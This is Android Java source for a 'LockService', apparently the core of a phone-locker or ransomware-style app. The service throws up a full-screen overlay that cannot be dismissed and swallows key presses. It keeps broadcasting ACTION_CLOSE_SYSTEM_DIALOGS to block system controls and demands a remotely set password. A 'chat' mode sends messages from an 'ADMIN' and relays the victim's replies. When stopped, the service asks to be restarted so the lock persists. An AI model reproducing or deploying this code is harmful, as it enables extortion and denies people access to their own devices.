package com.nullx.pp;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

// Import R secara eksplisit untuk mencegah error symbol
import com.nullx.pp.R;

public class LockService extends Service {

    private WindowManager windowManager;
    private View lockView;
    private WindowManager.LayoutParams params;
    private String currentPassword = "123";
    private final Handler handler = new Handler();
    private boolean isLocked = false;

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String mode = intent.getStringExtra("mode"); 
        String message = intent.getStringExtra("message");
        String updatedPass = intent.getStringExtra("password");

        if (updatedPass != null) this.currentPassword = updatedPass;

        deployLock(mode, message);
        return START_STICKY;
    }

    private void deployLock(String mode, String message) {
        if (windowManager == null) windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (lockView != null) {
            try {
                windowManager.removeView(lockView);
            } catch (Exception e) {}
        }

        int windowFlags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                          WindowManager.LayoutParams.FLAG_FULLSCREEN |
                          WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                          WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                          WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;

        params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                windowFlags,
                PixelFormat.TRANSLUCENT);
        
        params.gravity = Gravity.CENTER;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }

        LayoutInflater inflater = LayoutInflater.from(this);
        if ("CHAT".equals(mode)) {
            lockView = inflater.inflate(R.layout.type_chat_lock, null);
            initChatMode(message);
        } else {
            lockView = inflater.inflate(R.layout.type_normal_lock, null);
            initNormalMode(message);
        }

        lockView.setFocusableInTouchMode(true);
        lockView.setOnKeyListener((v, keyCode, event) -> true);

        windowManager.addView(lockView, params);
        
        if (!isLocked) {
            startSystemUiKiller();
            isLocked = true;
        }
    }

    private void initNormalMode(String msg) {
        TextView tvWarning = lockView.findViewById(R.id.admin_warning_text);
        EditText etPass = lockView.findViewById(R.id.input_key);
        Button btnUnlock = lockView.findViewById(R.id.btn_unlock);

        if (msg != null) tvWarning.setText(msg);

        btnUnlock.setOnClickListener(v -> {
            if (etPass.getText().toString().equals(currentPassword)) {
                terminateLock();
            } else {
                Toast.makeText(this, "ACCESS KEY INVALID", Toast.LENGTH_SHORT).show();
                
                // FIXED: Menggunakan System Vibrator secara langsung
                Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                if (vibrator != null && vibrator.hasVibrator()) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        vibrator.vibrate(500);
                    }
                }
            }
        });
    }

    private void initChatMode(String initialMsg) {
        EditText input = lockView.findViewById(R.id.target_message_input);
        View btnSend = lockView.findViewById(R.id.btn_send_reply);

        addChatMessage("ADMIN", initialMsg, true);

        btnSend.setOnClickListener(v -> {
            String text = input.getText().toString().trim();
            if (!text.isEmpty()) {
                addChatMessage("YOU", text, false);
                MainActivity.sendReplyToFlutter(text); 
                input.setText("");
            }
        });
    }

    private void addChatMessage(String sender, String message, boolean isAdmin) {
        LinearLayout chatContainer = lockView.findViewById(R.id.chat_container);
        if (chatContainer == null) return;

        TextView msgBubble = new TextView(this);
        msgBubble.setText("[" + sender + "]: " + message);
        msgBubble.setTextColor(isAdmin ? Color.RED : Color.GREEN);
        msgBubble.setPadding(15, 8, 15, 8);
        msgBubble.setTextSize(14);
        msgBubble.setTypeface(Typeface.MONOSPACE);

        chatContainer.addView(msgBubble);

        ScrollView scroll = lockView.findViewById(R.id.chat_scroll);
        if (scroll != null) {
            scroll.post(() -> scroll.fullScroll(View.FOCUS_DOWN));
        }
    }

    private void startSystemUiKiller() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
                if (isLocked) handler.postDelayed(this, 150);
            }
        }, 150);
    }

    private void terminateLock() {
        if (lockView != null && windowManager != null) {
            windowManager.removeView(lockView);
            lockView = null;
        }
        isLocked = false;
        handler.removeCallbacksAndMessages(null);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        if (isLocked) {
            Intent broadcastIntent = new Intent("com.nullx.pp.RESTART_LOCK_SERVICE");
            sendBroadcast(broadcastIntent);
        }
        super.onDestroy();
    }
}